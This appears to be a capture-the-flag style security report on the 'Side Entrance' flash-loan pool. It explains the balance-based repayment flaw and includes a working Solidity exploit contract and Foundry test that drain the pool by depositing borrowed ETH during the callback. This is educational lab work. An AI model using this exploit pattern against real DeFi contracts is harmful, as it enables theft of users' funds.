# Security Report: Side Entrance

---

## 1. Vulnerability Summary

The `SideEntranceLenderPool` contains an accounting vulnerability in its flash loan mechanism.

The pool verifies flash loan repayment by checking whether its ETH balance has returned to its previous value.

However, the pool also allows anyone to deposit ETH and records deposits in an individual balance mapping.

An attacker can exploit this by depositing the borrowed ETH back into the pool during the flash loan callback. This restores the pool's ETH balance while simultaneously crediting the attacker with an equivalent deposit balance.

After the flash loan completes, the attacker can withdraw the credited deposit and extract the borrowed funds without violating the repayment check.

## 2. Affected Code

**Contract:** `SideEntranceLenderPool.sol`

### A. Vulnerable Flash Loan Verification

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    IFlashLoanEtherReceiver(msg.sender)
        .execute{value: amount}();

    if (address(this).balance < balanceBefore) {
        revert RepayFailed();
    }
}
```

**Root Cause:**

The contract verifies repayment using its total ETH balance rather than tracking whether the borrowed amount was genuinely repaid.

A deposit during the callback can satisfy this balance check without representing an actual repayment.

### B. Deposit Accounting

```solidity
function deposit() external payable {
    unchecked {
        balances[msg.sender] += msg.value;
    }
    emit Deposit(msg.sender, msg.value);
}
```

The deposit function credits the caller's account with the supplied ETH.

Consequently, the attacker can convert temporarily borrowed ETH into a withdrawable deposit balance.

### C. Withdrawal Mechanism

```solidity
function withdraw() external {
    uint256 amount = balances[msg.sender];

    delete balances[msg.sender];
    emit Withdraw(msg.sender, amount);

    SafeTransferLib.safeTransferETH(msg.sender, amount);
}
```

The attacker can subsequently withdraw the credited balance and extract the funds from the pool.

## 3. Exploitation Mechanism

The exploit consists of three stages.

**Stage 1 – Borrow the Entire Pool Balance**

The attacker requests a flash loan of 1,000,000 ETH.

**Stage 2 – Deposit Borrowed ETH During Callback**

The malicious receiver implements the `execute()` callback and deposits the borrowed ETH back into the pool.

```solidity
function execute() external payable {
    pool.deposit{value: msg.value}();
}
```

This operation:
- Restores the pool's ETH balance.
- Credits the attacker's deposit mapping with 1,000,000 ETH.
- Satisfies the flash loan balance verification.

**Stage 3 – Withdraw the Deposited Amount**

After the flash loan completes, the attacker calls `withdraw()`.

The pool transfers the credited 1,000,000 ETH to the attacker, effectively draining its entire balance.

The attacker can then forward the extracted ETH to the recovery address.

## 4. Proof of Concept (Foundry)

The following illustrates the intended attack sequence.

### Step 1 – Implement Malicious Receiver

```solidity
contract PlayerExecute {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();

        (bool success,) = payable(msg.sender).call{
            value: amount
        }("");

        require(success);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```

### Step 2 – Execute Exploit

```solidity
player.attack(1000000 ether);
```

The attack contract:
1. Initiates the flash loan.
2. Deposits the borrowed ETH during the callback.
3. Withdraws its newly credited deposit.
4. Transfers the extracted ETH to the recovery address.

### Step 3 – Verify Final State

```solidity
assertEq(address(pool).balance, 0 ether);

assertEq(
    address(recovery).balance,
    1000000 ether
);
```

These assertions confirm that the entire pool balance has been extracted.

## 5. Security Impact

- **Complete Fund Drain:** An attacker can extract the entire ETH balance held by the pool.
- **Accounting Manipulation:** Borrowed funds are incorrectly recognized as legitimate deposits.
- **Unauthorized Withdrawal:** The attacker obtains a withdrawable balance without contributing their own ETH.
- **Permissionless Exploitation:** No privileged access is required.

## 6. Conclusion

The vulnerability originates from treating the restoration of the contract's ETH balance as sufficient proof of flash loan repayment.

By depositing borrowed ETH during the callback, an attacker can simultaneously satisfy the repayment check and manipulate the pool's internal deposit accounting.

The attacker can subsequently withdraw the credited balance and drain the entire pool.

**Result:** The intended Foundry exploit demonstrates how a flash loan callback can be abused to manipulate internal accounting and extract the pool's entire ETH balance.
